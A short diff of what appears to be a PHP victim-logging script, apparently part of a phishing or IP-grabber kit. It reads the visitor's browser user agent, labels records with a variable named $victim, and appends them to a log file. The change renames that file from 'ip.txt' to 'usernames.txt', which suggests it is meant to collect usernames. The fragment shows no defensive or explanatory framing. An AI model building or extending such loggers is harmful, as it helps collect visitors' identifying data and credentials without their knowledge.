@@ -13,7 +13,7 @@ else
     }
 $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
-$file = 'ip.txt';
+$file = 'usernames.txt';
 $victim = "IP: ";
 $fp = fopen($file, 'a');
 fwrite($fp, $victim);
